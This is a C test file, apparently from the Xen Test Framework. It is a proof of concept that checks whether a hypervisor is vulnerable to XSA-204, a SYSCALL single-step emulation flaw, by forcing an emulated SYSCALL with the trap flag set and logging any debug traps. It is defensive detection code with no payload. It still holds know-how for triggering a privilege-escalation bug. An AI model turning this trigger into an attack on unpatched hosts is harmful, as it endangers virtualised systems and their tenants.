/**
 * @file tests/xsa-204/main.c
 * @ref test-xsa-204
 *
 * @page test-xsa-204 XSA-204
 *
 * Advisory: [XSA-204](http://xenbits.xen.org/xsa/advisory-204.html)
 *
 * SYSCALL (unlike most instructions) evaluates its singlestep action based on
 * the resulting EFLAGS.TF, not the starting EFLAGS.TF.  As the @#DB is raised
 * after the CPL change and before the OS can switch stack, it is a large risk
 * for privilege escalation.  This is also undocumented behaviour.
 *
 * This test masks TF in MSR_FMASK, enables TF and forces a SYSCALL
 * instruction through the emulator.
 *
 * If vulnerable to XSA-204, a single @#DB will be rased at the start of
 * entry_SYSCALL_64().  If not vulnerable, no @#DB will be seen at all.
 *
 * @see tests/xsa-204/main.c
 */
#include <xtf.h>

#include <arch/msr-index.h>
#include <arch/processor.h>

bool test_needs_fep = true;
bool test_wants_user_mappings = true;
const char test_title[] = "XSA-204 PoC";

void entry_SYSCALL_64(void);
asm(".align 8;"
    "entry_SYSCALL_64:"
    "and $~" STR(X86_EFLAGS_TF) ", %r11;"
    "sysretq;"
    );

static void user_force_syscall(void)
{
    asm volatile ("pushf;"
                  "orl $%c[TF], (%%rsp);"
                  "popf;"

                  _ASM_XEN_FEP
                  "syscall;"
                  ::
                   [TF] "i" (X86_EFLAGS_TF)
                  : "rcx", "r11");
}

void test_main(void)
{
    if ( !cpu_has_syscall )
        return xtf_skip("Skip: SYSCALL not suported\n");

    /* Enable SYSCALL/SYSRET. */
    wrmsr(MSR_EFER, rdmsr(MSR_EFER) | EFER_SCE);

    /* Lay out the GDT suitably for SYSCALL/SYSRET. */
    gdt[GDTE_AVAIL0] = gdt[__KERN_CS >> 3]; /* SYSCALL %cs/%ss selectors */
    gdt[GDTE_AVAIL1] = gdt[GDTE_DS32_DPL0];

    gdt[GDTE_AVAIL2] = gdt[GDTE_CS32_DPL3]; /* SYSRET  %cs/%ss selectors */
    gdt[GDTE_AVAIL3] = gdt[GDTE_DS32_DPL3];
    gdt[GDTE_AVAIL4] = gdt[GDTE_CS64_DPL3];

    /* Set up the MSRs. */
    wrmsr(MSR_STAR, ((((uint64_t)GDTE_AVAIL0 * 8 + 0) << 32) |
                     (((uint64_t)GDTE_AVAIL2 * 8 + 3) << 48)));
    wrmsr(MSR_LSTAR, _u(entry_SYSCALL_64));
    wrmsr(MSR_FMASK, X86_EFLAGS_TF);

    xtf_exlog_start();
    exec_user_void(user_force_syscall);
    xtf_exlog_stop();

    if ( xtf_exlog_entries() != 0 )
        xtf_failure("Fail: Observed debug traps - vulnerable to XSA-204\n");
    else
        xtf_success("Success: Not vulnerable to XSA-204\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
